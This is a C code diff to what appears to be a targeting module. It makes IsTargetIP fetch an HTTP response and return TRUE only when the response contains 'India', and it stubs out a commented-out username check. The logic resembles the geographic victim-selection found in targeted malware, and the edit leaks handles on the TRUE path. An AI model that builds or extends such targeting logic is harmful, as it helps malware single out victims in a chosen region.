@@ -1,5 +1,6 @@
 #include "target.h"
 
+#include <windows.h>
 #include <wininet.h>
 #include <stdio.h>
 
@@ -47,25 +48,30 @@ BOOL IsTargetIP()
 			break;
 
 		if (!Success) {
-			//printf("InternetReadFile error : <%lu>\n",
-			//       GetLastError());
+			return FALSE;
 		} else {
 			// NULL terminator
 			Buffer[BytesRead] = 0;
 		}
 	}
 
-	printf("%s\n", Buffer);
+	if (strstr(Buffer, "India") != NULL) {
+		return TRUE;
+	}
 
 	InternetCloseHandle(hHttpFile);
 	InternetCloseHandle(hConnect);
 	InternetCloseHandle(hSession);
 
-	return TRUE;
+	return FALSE;
 }
 
-BOOL IsTarget()
-{
+//BOOL IsTargetUsername() {
+//	wchar_t Username[UNLEN + 1];
+//	GetUserNameW();
+//}
+
+BOOL IsTarget() {
 	if (!IsTargetIP())
 		return FALSE;
 
